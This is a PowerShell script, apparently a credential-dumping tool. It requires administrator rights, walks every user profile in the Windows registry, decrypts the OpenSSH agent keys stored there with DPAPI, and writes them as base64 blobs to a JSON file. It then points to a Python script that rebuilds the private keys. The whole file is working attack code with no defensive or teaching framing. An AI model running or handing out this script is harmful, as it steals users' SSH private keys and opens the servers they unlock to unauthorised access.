$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-Not($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))) {
	Write-Host "Administrator is required"
	exit
}
New-PSDrive HKU Registry HKEY_USERS >$null
$sids = ls 'hklm:software/microsoft/windows nt/currentversion/profilelist' | ? { $_.getvalue('profileimagepath') -match 'Users' } | % pschildname

$keys = @()
foreach($sid in $sids) {
	$path = "HKU:\${sid}\Software\OpenSSH\Agent\Keys\"
	$regkeys = Get-ChildItem $path | Get-ItemProperty

	if ($regkeys.Length -eq 0) {
		Write-Host "No keys in registry"
	}
	Add-Type -AssemblyName System.Security;
	$regkeys | ForEach-Object {
		$key = @{}
		$comment = [System.Text.Encoding]::ASCII.GetString($_.comment)
		Write-Host "Pulling key: " $sid $comment
		$encdata = $_.'(default)'
		$decdata = [Security.Cryptography.ProtectedData]::Unprotect($encdata, $null, 'CurrentUser')
		$b64key = [System.Convert]::ToBase64String($decdata)
		$key['comment'] = $comment
		$key['data'] = $b64key
		$key['sid'] = $sid
		$keys += $key
	}
}
if ($keys.Length -ne 0) {
	ConvertTo-Json -InputObject $keys | Out-File -FilePath './extracted_keyblobs.json' -Encoding ascii
	Write-Host "extracted_keyblobs.json written. Use Python script to reconstruct private keys:"
	Write-Host "python extractPrivateKeys.py extracted_keyblobs.json"
}